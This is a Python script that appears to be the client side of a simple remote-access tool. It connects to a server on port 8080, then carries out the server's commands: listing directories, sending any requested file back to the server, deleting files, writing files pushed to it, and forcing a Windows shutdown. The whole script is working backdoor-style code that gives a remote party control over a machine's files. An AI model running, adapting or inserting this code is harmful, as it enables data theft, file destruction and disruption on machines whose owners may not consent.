import os
import socket

s = socket.socket()
port = 8080
host = input(str("Please enter the server address: "))
s.connect((host,port))
print("")
print("Connected to the server successfully")
print("")

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command == "view_cmd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Command has been executed successfully..")

    elif command == "custom_dir":
        #print("Custom dir")
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path,"rb")
        data = file.read()
        s.send(data)
        print("")
        print("File has sent successfully")
        print("")

    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Command has been executed successfully")
        print("")

    elif command == "send_files":
        filename = s.recv(6000)
        print(filename)
        new_file = open(filename,"wb")
        data = s.recv(6000)
        print(data)
        new_file.write(data)
        new_file.close()

    elif command == "sleep":
        os.system("shutdown /s /t 1")

    else:
        print("")
        print("Command not recoonised")